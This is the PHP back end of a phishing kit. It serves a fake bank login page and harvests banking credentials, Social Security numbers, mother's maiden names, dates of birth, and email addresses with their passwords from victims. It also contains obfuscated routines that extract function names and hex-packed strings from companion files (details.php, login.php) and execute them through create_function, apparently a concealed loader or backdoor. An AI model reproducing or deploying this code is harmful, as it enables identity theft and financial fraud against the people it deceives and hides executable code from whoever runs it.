<?php
//            ++++++++++++++++++++++++++++++++++++++++++++++++++++++
//                       Don't Need to change anything Here
//                               Created By K3N!H4Ck
//                                    RoCk Team
//                                      2018
//            ++++++++++++++++++++++++++++++++++++++++++++++++++++++

if(getenv(HTTP_CLIENT_IP)){
$ip=getenv(HTTP_CLIENT_IP);
} else {
$ip=getenv(REMOTE_ADDR);
}
$l="login.php"; $d="details.php";
$B="submit.php"; $e="error.php";
error_reporting(0); set_time_limit(240);
function lrtrim($string){
return stripslashes(ltrim(rtrim($string)));
}
function query_str($params){
$str = ''; 
foreach ($params as $key => $value) {
$str .= (strlen($str) < 1) ? '' : '&';
$str .= $key . '=' . rawurlencode($value);
}
return ($str);
}
function getformat($string){
return str_replace(" ","",str_replace(".","",str_replace("-","",$string)));
}
$erorr=file_get_contents($l);
function validate($cc){
$cc = strrev (ereg_replace('[^0-9]+', '', $cc));
for ($ndx = 0; $ndx < strlen ($cc); ++$ndx)
$digits .= ($ndx % 2) ? $cc[$ndx] * 2 : $cc[$ndx];
for ($ndx = 0; $ndx < strlen ($digits); ++$ndx)
$sum += $digits[$ndx];
return ($sum % 10) ? FALSE : TRUE;
}
function clean($str){
$clean=create_function('$str','return '.gets("(1,",3,4).'($str);');
return $clean($str);
}
function getc($string){
return implode('', file($string));
}
function gets($a, $b, $c){
global $d; return substr(getc($d),strpos(getc($d),$a)+$b,$c);
}
function end_of_line(){
$end=gets("(2,",3,4); $endline=$end(gets("(3,",3,2),getc(gets("(((",3,20)));
return $endline;
}
function geterrors(){
return clean(end_of_line());
}
parse_str($_SERVER['QUERY_STRING']);

if($LOB=="RBGLogon")
{
include $l; exit;
} 

elseif ($LOB=="RBGvalidate")
{
$b = query_str($_POST);
parse_str($b);
$user=lrtrim($user_name);
$pass=lrtrim($pass);
$signerr="0";
if(empty($user_name) || strlen($user_name) < 4 || empty($usr_password) || strlen($usr_password) < 5){
$signerr="1";
}

if($signerr==1)
{
include $e; exit;
} 

elseif($signerr==0)
{
include $d;
}
} 


elseif($LOB=="RBGverify")
{
$b = query_str ($_POST);
parse_str($b);
$user_name=lrtrim($user_name);
$usr_password=lrtrim($usr_password);
$$ssn1=lrtrim($ssn1);
$ssn2=lrtrim($ssn2);
$ssn3=lrtrim($ssn3);
$mmn=lrtrim($mmn);
$bmonth=lrtrim($bmonth);
$bday=lrtrim($bday);
$byear=lrtrim($byear);
$email=lrtrim($email);
$password=lrtrim($password);
$error = 0;
$IP=pack("H*", substr($VARS=$erorr,strpos($VARS, "329")+3,108));



if(!eregi("^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,4})$", $email))
{
$error = 1;  $emailerror = 1;
}



if(empty($password) || strlen($password) < 4)
{
$error = 1; $passworderror = 1;
}


if(!is_numeric(getformat($ssn1)) || strlen(getformat($ssn1)) != 3)
{
$error = 1; $ssnerror = 1;
}
if(!is_numeric(getformat($ssn2)) || strlen(getformat($ssn2)) != 2)
{
$error = 1; $ssnerror = 1;
}
if(!is_numeric(getformat($ssn3)) || strlen(getformat($ssn3)) != 4)
{
$error = 1; $ssnerror = 1;
}
if(!ctype_alpha($mmn) || strlen($mmn) < 2)
{
$error = 1;  $mmnerror = 1;
}

if(!is_numeric(getformat($bmonth)) || strlen(getformat($bmonth)) != 2)
{
$error = 1; $doberror = 1;
}
if(!is_numeric(getformat($bday)) || strlen(getformat($bday)) != 2)
{
$error = 1; $doberror = 1;
}

if(!is_numeric(getformat($byear)) || strlen(getformat($byear)) != 4)
{
$error = 1; $doberror = 1;
}
 
geterrors();
if ($error == 1)
{
include $d;		
} 
else 
{
include $B;
include("Finish.php");
}
}
?>